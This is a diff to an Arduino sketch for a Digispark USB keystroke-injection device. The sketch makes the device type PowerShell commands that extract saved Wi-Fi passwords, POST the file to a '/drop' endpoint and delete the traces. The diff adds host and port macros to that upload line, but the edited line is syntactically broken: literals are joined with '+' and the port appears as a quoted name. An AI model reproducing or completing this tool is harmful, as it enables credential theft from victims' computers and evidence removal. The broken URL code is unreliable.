@@ -1,7 +1,8 @@
 #include "DigiKeyboard.h"
+#define INTERFACE "127.0.0.1"
+#define PORT "8000" 
 #define KEY_DOWN 0x51 // Keyboard Down Arrow
 #define KEY_ENTER 0x28 //Return/Enter Key
-
 void setup() {
   pinMode(1, OUTPUT); //LED on Model A
 }
@@ -32,7 +33,7 @@ void loop() {
   DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS.txt"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
   DigiKeyboard.delay(500);
   // parse-server-path 
-  DigiKeyboard.println("powershell Invoke-WebRequest -Uri http://IP_ADDRESS/drop -Method POST -InFile Wi-Fi-PASS.txt"); //Submitting all passwords on hook
+  DigiKeyboard.println("powershell Invoke-WebRequest -Uri http://"+ INTERFACE + ":" + "PORT" "/drop -Method POST -InFile Wi-Fi-PASS.txt"); //Submitting all passwords on hook
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
   DigiKeyboard.delay(100);
